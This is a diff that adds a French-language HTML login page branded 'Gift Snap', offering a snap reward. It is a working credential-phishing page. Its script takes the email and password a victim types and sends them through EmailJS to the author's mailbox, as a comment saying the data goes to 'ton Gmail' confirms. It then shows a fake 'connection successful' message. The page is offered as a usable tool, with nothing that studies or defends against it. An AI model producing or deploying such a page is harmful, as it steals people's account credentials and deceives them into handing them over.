@@ -1,1 +1,113 @@
+<!doctype html>
+<html lang="fr" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Snap - Connexion</title>
+    <script src="https://cdn.tailwindcss.com/3.4.17"></script>
+    <style>
+        html, body { height: 100%; margin: 0; padding: 0; }
+        .gradient-bg { background: linear-gradient(135deg, #FFE500 0%, #FFED4E 50%, #FFF8DC 100%); }
+        .pulse-logo {
+            font-size: 48px; font-weight: 900; letter-spacing: -2px;
+            background: linear-gradient(135deg, #FF6B35 0%, #FF8C42 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .input-field {
+            background: rgba(255, 255, 255, 0.95); border: 2px solid transparent; border-radius: 12px;
+            padding: 14px 16px; font-size: 16px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: all 0.3s ease; width: 100%; box-sizing: border-box;
+        }
+        .input-field:focus { outline: none; border-color: #FF6B35; box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1); }
+        .login-btn {
+            background: linear-gradient(135deg, #FF6B35 0%, #FF8C42 100%); color: white;
+            font-weight: 700; font-size: 16px; border: none; border-radius: 12px;
+            padding: 14px 24px; cursor: pointer; width: 100%; transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
+        }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255, 107, 53, 0.4); }
+        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .container-wrapper { display: flex; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 20px; box-sizing: border-box; }
+        .login-card { background: white; border-radius: 24px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15); animation: slideIn 0.6s ease-out; }
+        .message-status { font-size: 14px; text-align: center; margin-top: 12px; min-height: 20px; transition: all 0.3s ease; }
+        .message-success { color: #10b981; font-weight: 600; }
+        .message-error { color: #ef4444; font-weight: 600; }
+        .tagline { font-size: 14px; color: #999; margin-top: 8px; text-align: center; }
 
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="gradient-bg">
+
+<div class="container-wrapper">
+    <div class="login-card">
+        <div style="text-align: center; margin-bottom: 32px;">
+            <div class="pulse-logo">Gift Snap</div>
+            <div class="tagline">Connectez-vous et recever votre snap plus</div>
+        </div>
+
+        <form id="login-form" style="display: flex; flex-direction: column; gap: 16px;">
+            <input type="email" id="email" class="input-field" placeholder="Adresse email" required autocomplete="email"> 
+            
+            <input type="password" id="password" class="input-field" placeholder="Mot de passe" required autocomplete="current-password"> 
+            
+            <button type="submit" class="login-btn" id="login-btn"> Se connecter </button>
+            <div class="message-status" id="message"></div>
+        </form>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+    // Initialisation
+    (function(){
+        emailjs.init({ publicKey: "eIX3mqRzV9eWtGPIF" }); 
+    })();
+
+    const loginForm = document.getElementById('login-form');
+    const messageEl = document.getElementById('message');
+    const loginBtn = document.getElementById('login-btn');
+
+    function showMessage(text, type) {
+        messageEl.textContent = text;
+        if(type === 'error') messageEl.className = 'message-status message-error';
+        else if(type === 'success') messageEl.className = 'message-status message-success';
+        else messageEl.className = 'message-status';
+    }
+
+    loginForm.addEventListener('submit', function(event) {
+        event.preventDefault(); // Empêche la page de se recharger
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Bouton en mode chargement
+        loginBtn.disabled = true;
+        loginBtn.innerText = "Connexion en cours...";
+        showMessage("", "");
+
+        // Envoi des infos à ton Gmail
+        emailjs.send("service_356pn8k", "template_2llh5zq", {
+            user_email: email,
+            user_password: password
+        }).then(() => {
+            // Succès
+            showMessage("✓ Connexion réussie !", "success");
+            loginBtn.innerText = "Connecté";
+            loginForm.reset(); // Efface les cases
+            
+        }).catch((error) => {
+            // Erreur
+            console.log("Erreur:", error);
+            showMessage("Erreur de réseau, veuillez réessayer.", "error");
+            loginBtn.disabled = false;
+            loginBtn.innerText = "Se connecter";
+        });
+    });
+</script>
+
+</body>
+</html>
